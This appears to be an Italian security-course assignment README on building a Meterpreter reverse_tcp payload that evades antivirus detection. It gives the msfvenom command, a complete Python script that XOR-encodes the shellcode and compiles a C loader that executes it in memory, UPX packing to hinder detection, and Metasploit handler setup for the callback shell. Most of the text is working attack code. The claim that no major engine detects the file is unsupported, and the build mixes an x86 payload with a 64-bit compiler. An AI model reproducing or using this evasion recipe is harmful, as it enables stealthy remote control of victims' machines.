# 📝 Consegna S9/L1
# **Creazione di un Payload Offuscato** 🚀

Questo progetto documenta la creazione di un payload `Meterpreter` irriconoscibile da VirusTotal, mantenendone la funzionalità e garantendo l'esecuzione su un ambiente Windows, come **FlareVM**. Il processo include tecniche avanzate di offuscamento, encoding personalizzato e il trasferimento sicuro tra ambienti virtualizzati.

---

## ⚙️ **Prerequisiti**
Prima di iniziare, assicurati di avere:
- 🐧 **Kali Linux** come macchina virtuale.
- 🪟 **Windows FlareVM** come sistema di test.
- 🖥️ **VirtualBox** o un altro hypervisor con supporto per cartelle condivise.
- 🔧 Strumenti necessari:
  - `msfvenom`
  - `gcc` (MinGW per Kali Linux)
  - `python3`
  - `upx` (opzionale per il packing).

---

## 📜 **Passaggi principali**

### 1️⃣ **Generazione del payload di base**
Creare un payload `Meterpreter reverse_tcp` con **msfvenom**:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=5959 -a x86 --platform windows -f raw -o base_payload.raw
```
> Questo genera un payload grezzo che sarà successivamente offuscato.

---

### 2️⃣ **Offuscamento personalizzato con XOR**
Creare uno script Python per codificare il payload con l'algoritmo **XOR** e generare un decoder runtime in C:
```python
import random
import os

def create_executable(payload_file, output_file):
    # Leggi il payload originale
    with open(payload_file, "rb") as f:
        payload = f.read()

    # Genera una chiave XOR casuale
    key = random.randint(1, 255)

    # Codifica il payload con XOR
    encoded_payload = bytearray([byte ^ key for byte in payload])

    # Crea il decoder in C
    decoder = f'''
#include <windows.h>
unsigned char payload[] = {{
    {", ".join(f"0x{byte:02x}" for byte in encoded_payload)}
}};
int main() {{
    unsigned char key = {key};  // Chiave XOR
    int length = sizeof(payload);
    for (int i = 0; i < length; i++) {{
        payload[i] ^= key;
    }}
    void (*exec)() = (void (*)())payload;
    exec();
    return 0;
}}
    '''

    # Scrivi il decoder in un file temporaneo
    with open("decoder.c", "w") as f:
        f.write(decoder)

    # Compila il file C in un eseguibile usando MinGW
    os.system(f"x86_64-w64-mingw32-gcc -o {output_file} decoder.c")
    os.remove("decoder.c")

create_executable("base_payload.raw", "final_payload.exe")
```

Esegui lo script:
```bash
python3 xor_coding.py
```

---

### 3️⃣ **Packing con UPX (opzionale)** 🧊
Per ridurre ulteriormente la probabilità di rilevamento, utilizza il tool **UPX**:
```bash
upx --best --ultra-brute final_payload.exe
```

---

### 4️⃣ **Trasferimento del file su Windows**
Configurare una **cartella condivisa** tra Kali Linux e Windows per trasferire il file generato:
1. In VirtualBox, aggiungi una cartella condivisa denominata `CONDIVISA` e abilita il **montaggio automatico**.
2. Monta la cartella su Kali Linux:
   ```bash
   sudo mount -t vboxsf CONDIVISA /mnt/CONDIVISA
   ```
3. Copia il file `final_payload.exe` nella cartella condivisa:
   ```bash
   cp final_payload.exe /mnt/CONDIVISA
   ```
4. Accedi al file su Windows dalla cartella condivisa.

---

### 5️⃣ **Test su FlareVM** 🧪
Esegui il payload su **Windows FlareVM** per verificare il funzionamento:
1. Configura Metasploit sulla macchina di Kali Linux:
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.23
   set LPORT 5959
   exploit
   ```
2. Esegui il file `final_payload.exe` su FlareVM e verifica che la connessione venga stabilita.

---

## 📊 **Risultati**
- **Rilevamento su VirusTotal**: Il file generato risulta **irriconoscibile** da tutti i principali motori antivirus grazie all'uso combinato di offuscamento XOR, decoder runtime personalizzato e packing.
- **Compatibilità**: Il file è eseguibile su Windows e compatibile con FlareVM per il test.

---

## 🛠️ **Debugging e miglioramenti**
Se il file non funziona correttamente:
- Assicurati che **x86_64-w64-mingw32-gcc** sia configurato correttamente.
- Testa il file senza **UPX**, in quanto alcuni packer possono interferire con l'esecuzione.
- Verifica il payload grezzo usando `msfvenom` per garantire che non sia corrotto.

---
